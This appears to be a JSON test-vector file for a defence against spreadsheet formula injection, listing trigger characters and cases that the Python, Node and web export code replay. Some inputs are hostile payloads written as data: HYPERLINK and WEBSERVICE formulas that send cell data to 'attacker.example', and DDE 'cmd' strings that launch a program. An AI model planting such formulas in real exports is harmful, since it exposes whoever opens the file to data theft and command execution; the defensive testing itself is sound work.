{
  "description": "SEC-B-06 (ADR-TEXT-01): one rule for a text cell written to a file a spreadsheet opens (CSV, TSV, XLSX). A cell a spreadsheet would run as a formula or a DDE command gets the prefix, so it opens as the text it is. Python (harness_core.security.spreadsheet_cells, used by every CSV export: app.utils.conversation_tasks._rows_to_csv_bytes), Node (src/libs/utils/spreadsheet-cell.ts, for any export Node writes) and the web client (lib/utils/spreadsheet-cell.ts, the chat's table export) carry these sets as constants and replay every case. A cell is neutralised when its first code point is in 'startsAlways', or when, after the code points in 'leading' are skipped, the first one is in 'triggers' the cell is not a plain number (an optional sign, ASCII digits with '.' or ',' separators, an optional exponent, an optional '%', and nothing else), and it is not a sign in 'signs' with only code points in 'leading' around it (a table's '-' placeholder). Only text cells: a number or date value is written as it is. Code points are hex.",
  "prefix": "'",
  "triggers": ["003D", "002B", "002D", "0040", "FF1D", "FF0B", "FF0D", "FF20"],
  "startsAlways": ["0009", "000D"],
  "signs": ["002B", "002D", "FF0B", "FF0D"],
  "leading": ["0009", "000A", "000B", "000C", "000D", "0020", "00A0", "1680", "2000", "2001", "2002", "2003", "2004", "2005", "2006", "2007", "2008", "2009", "200A", "200B", "2028", "2029", "202F", "205F", "3000", "FEFF"],
  "cases": [
    {"name": "plain text", "in": "Quarterly revenue", "out": "Quarterly revenue"},
    {"name": "a HYPERLINK exfiltration", "in": "=HYPERLINK(\"https://attacker.example/?d=\"&B2,\"open\")", "out": "'=HYPERLINK(\"https://attacker.example/?d=\"&B2,\"open\")"},
    {"name": "a WEBSERVICE call", "in": "=WEBSERVICE(\"https://attacker.example/\"&A1)", "out": "'=WEBSERVICE(\"https://attacker.example/\"&A1)"},
    {"name": "a DDE command", "in": "=cmd|' /C calc'!A0", "out": "'=cmd|' /C calc'!A0"},
    {"name": "a DDE command behind arithmetic", "in": "-2+3+cmd|' /C calc'!A0", "out": "'-2+3+cmd|' /C calc'!A0"},
    {"name": "an at-sign function", "in": "@SUM(1+1)*cmd|' /C calc'!A0", "out": "'@SUM(1+1)*cmd|' /C calc'!A0"},
    {"name": "a plus formula", "in": "+1+1", "out": "'+1+1"},
    {"name": "a minus formula", "in": "-A1*2", "out": "'-A1*2"},
    {"name": "leading spaces before a formula", "in": "   =1+1", "out": "'   =1+1"},
    {"name": "a leading tab", "in": "\tabc", "out": "'\tabc"},
    {"name": "a leading carriage return", "in": "\rabc", "out": "'\rabc"},
    {"name": "a newline then a formula", "in": "\n=1+1", "out": "'\n=1+1"},
    {"name": "a no-break space then a formula", "in": "\u00a0=1+1", "out": "'\u00a0=1+1"},
    {"name": "a zero-width space then a formula", "in": "\u200b=1+1", "out": "'\u200b=1+1"},
    {"name": "a BOM then a formula", "in": "\ufeff=1+1", "out": "'\ufeff=1+1"},
    {"name": "a full-width equals sign", "in": "＝HYPERLINK(\"x\")", "out": "'＝HYPERLINK(\"x\")"},
    {"name": "a full-width plus", "in": "＋1+1", "out": "'＋1+1"},
    {"name": "a full-width minus", "in": "－1+A1", "out": "'－1+A1"},
    {"name": "a full-width at", "in": "＠SUM(A1)", "out": "'＠SUM(A1)"},
    {"name": "an ideographic space then equals", "in": "\u3000=1", "out": "'\u3000=1"},
    {"name": "a negative number stays a number", "in": "-42", "out": "-42"},
    {"name": "a signed decimal stays a number", "in": "+3.14", "out": "+3.14"},
    {"name": "a negative with separators", "in": "-1,234.56", "out": "-1,234.56"},
    {"name": "a negative percentage", "in": "-12.5%", "out": "-12.5%"},
    {"name": "a negative exponent number", "in": "-1.5e-3", "out": "-1.5e-3"},
    {"name": "a European decimal", "in": "-0,75", "out": "-0,75"},
    {"name": "a lone minus is a table's placeholder", "in": "-", "out": "-"},
    {"name": "a lone plus", "in": "+", "out": "+"},
    {"name": "a lone minus after blanks", "in": "  -  ", "out": "  -  "},
    {"name": "a lone equals", "in": "=", "out": "'="},
    {"name": "a lone at", "in": "@", "out": "'@"},
    {"name": "a phone number with a plus", "in": "+1 415 555 0100", "out": "'+1 415 555 0100"},
    {"name": "a bullet-like dash", "in": "- item", "out": "'- item"},
    {"name": "an at mention", "in": "@channel", "out": "'@channel"},
    {"name": "an equals inside text", "in": "a=b", "out": "a=b"},
    {"name": "already neutralised", "in": "'=1+1", "out": "'=1+1"},
    {"name": "a leading space then text", "in": "  hello", "out": "  hello"},
    {"name": "a minus sign U+2212 is text", "in": "−5", "out": "−5"},
    {"name": "empty", "in": "", "out": ""}
  ]
}
